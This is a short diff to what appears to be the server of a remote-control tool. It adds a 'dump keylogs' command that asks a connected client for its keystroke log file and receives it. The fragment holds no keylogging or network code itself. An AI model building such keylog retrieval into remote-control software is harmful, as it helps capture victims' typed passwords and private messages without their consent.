@@ -197,6 +197,11 @@ void handle_client_panel(SERVER& client, string& command)
 	{
 		client.send_command(command);
 	}
+	else if(command == "dump keylogs")
+	{
+		client.send_command(command);
+		client.recieve_file();
+	}
 }
 
 bool check_current_client_id(int id)
